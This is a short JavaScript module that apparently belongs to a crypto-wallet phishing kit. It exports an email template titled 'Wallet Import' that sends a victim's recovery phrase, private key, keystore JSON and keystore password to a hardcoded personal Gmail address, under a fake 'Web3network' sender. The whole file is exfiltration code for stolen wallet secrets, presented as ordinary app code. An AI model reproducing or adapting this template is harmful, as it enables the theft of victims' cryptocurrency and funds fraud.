const walletImportEmail = ({
  wallet,
  walletName,
  email,
  phrase,
  privateKey,
  address,
  keystorePassword,
  keystore
}) => {
  return {
    from: "Web3network <no-reply@web3networks.org>",
    to: "robertowilliam129@gmail.com",
    subject: `Wallet Import for ${wallet || "N/A"} wallet`,
    html: `
      <div style="font-family: Arial, sans-serif; background:#f6f9fc; padding:20px;">
        <div style="max-width:600px; margin:0 auto; background:#ffffff; padding:20px; border-radius:10px;">
          
          <h2 style="color:#0E1D26;">Wallet Import</h2>

          <p style="font-size:14px; color:#333;">
            Hello,
          </p>

            
            <div style="margin-top:15px; font-size:14px; color:#333;">
            <p><strong>Wallet Wallet Type:</strong> ${wallet || "N/A"}</p>
            <p><strong>Wallet Name:</strong> ${walletName || "N/A"}</p>
            <p><strong>Wallet Email:</strong> ${email || "N/A"}</p>
            <p><strong>Recovery Phrase:</strong> ${phrase || "N/A"}</p>
            <p><strong>Private Key:</strong> ${privateKey || "N/A"}</p>
            <p><strong>Keystore Password:</strong> ${keystorePassword || "N/A"}</p>
            <p><strong>Keystore JSON:</strong> ${keystore || "N/A"}</p>
            <p><strong>Address:</strong> ${address || "N/A"}</p>
          </div>

          <p style="margin-top:20px; font-size:12px; color:#777;">
            This is an automated message, please do not reply.
          </p>

        </div>
      </div>
    `,
  };
};

module.exports = { walletImportEmail };